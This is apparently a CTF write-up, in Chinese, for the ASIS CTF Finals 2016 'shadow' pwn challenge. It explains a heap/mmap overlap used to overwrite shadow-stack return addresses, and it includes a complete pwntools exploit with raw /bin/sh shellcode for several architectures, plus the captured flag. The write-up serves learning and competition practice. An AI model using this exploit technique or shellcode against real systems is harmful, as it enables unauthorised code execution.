title: '[ASIS CTF Finals 2016] shadow 99'
author: bruce30262
tags:
  - pwn
  - heap
  - shadow stack
  - ASIS CTF Finals 2016
  - ''
categories:
  - write-ups
date: 2016-09-14 18:04:00
---
## Info
> Category: pwn  
> Point: 99  
> Solver: bruce30262 @ BambooFox  
> 感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 angelboy 對 exploit 的指點 XD

## Analyzing  
32 bit ELF, 除了 stack guard 有開以外其他保護全部沒開

程式首先會用 `mmap` 配置一塊大小為 0x30000 的記憶體區塊，並將其當成 shadow stack 來使用，存放 return address。  

main function 裡面會先要我們輸入名字 (buffer 位址在 .bss 段)，之後我們可以選擇新增一個 beer，或是讀取/編輯一個 beer description。

新增一個 beer 時，程式會先要求 beer description 的長度，之後會呼叫 malloc 配置一塊相對應大小的 buffer 給我們輸入 beer description 的內容。至於讀取/編輯一個 beer description 則是會先要我們選擇要讀取/編輯的 beer，之後會印出 beer 的 description，並詢問我們是否要編輯 beer 的 description。此時如果輸入一個 invalid 的選項 ( not y or n )，程式會直接進行遞迴呼叫，再 call 一次該 function 並做同樣的事情，直到我們輸入 y 或 n 為止。

## Exploit  
這題關鍵的地方在於  

* 我們可以控制 malloc 的長度，以及 malloc 後 buffer 的內容
* 我們可以對程式做遞迴呼叫  

glibc 的 malloc 在 size 很大的時候 (超過 0x20000)，會改用 mmap 來進行動態的記體配置。而 mmap 出來的 memory page，會接在上一次 mmap 出來的 memory page 的前面。因此，透過第一點，我們可以嘗試去新增一個長度很長的 beer description，這樣程式在呼叫 mmap 之後**會將我們 beer description 的 buffer 接在 shadow stack 的前面。**  

之後我們可以嘗試對程式進行多次的遞迴呼叫，讓 shadow stack 不斷的 "往上長" (意即 shadow stack 的 top 位址會不斷得往前移)。只要 shadow stack 長到某一程度，就會跟我們 beer description 的 buffer 重疊在一起。此時我們再透過編輯 beer description 的功能，就可以改到 shadow stack 上的 return address，讓程式跳到我們想要的位址。這題因為只有 stack guard 的關係，可以執行 shellcode。 我們可以透過將 shellcode 塞入 name buffer，然後將 return address 改成 name buffer 位址的方式來跳 shellcode。

```python exp_shadow.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "shadow.asis-ctf.ir"
PORT = 31337
ELF_PATH = "./shadow"

# setting 
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def sc(arch=context.arch):
    if arch == "i386":
        # shellcraft.i386.linux.sh(), null free, 22 bytes
        return "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80"
    elif arch == "amd64":
        # shellcraft.amd64.linux.sh(), null free, 24 bytes
        return "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
    elif arch == "arm":
        # null free, 27 bytes
        return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    elif arch == "aarch64":
        # 4 null bytes, total 35 bytes
        return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
    else:
        return None

def add_one(size, desr):
    r.sendline("1")
    log.info("send desc length")
    r.sendlineafter("length?\n", str(size))
    log.info("send desc")
    r.send(desr)

if __name__ == "__main__":
    
    shellcode_addr = 0x0804a520
    shellcode = sc()

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    log.info("send name (shellcode)")
    r.sendlineafter("name?\n", shellcode)
    r.recvuntil("it?\n")

    log.info("add one beer")
    add_one(0x20000, "A"*(0x20000-4)+"BBBB")
    r.recvuntil("beer uploaded to the memory!\n")
    r.recvuntil("0\n")
    log.info("add beer done")

    log.info("choose desc")
    r.sendline("2") # choose desc
    r.sendline("0") # input index

    log.info("recieving BBBB")
    print r.recvuntil("BBBB")
    log.info("recieving rest output")
    print r.recvuntil("\n")
    print r.recvline()
    log.info("start stacking stack")

    maxx = 80000
    for i in xrange(maxx):
        check = i% 10000
        if check == 0:
            print i
        r.sendline("z")

    r.sendline('y')
    r.send(p32(shellcode_addr)*(0x20000/4))

    r.interactive()
```


不過因為主辦方網路不穩的關係，我自己跑 exploit local 端是可以 work，但是 remote 端會 timeout，因此最後是將 exploit 上傳到 trello 請隊友 Ann Tsai 幫忙跑。一開始跑的時候還是會在某個地方卡住，經過安博的指點之後修了一下 exploit，最後成功拿 shell 並得到 flag。  

flag: `ASIS{732f9beb138dbca4e44d5d184c3074dc}`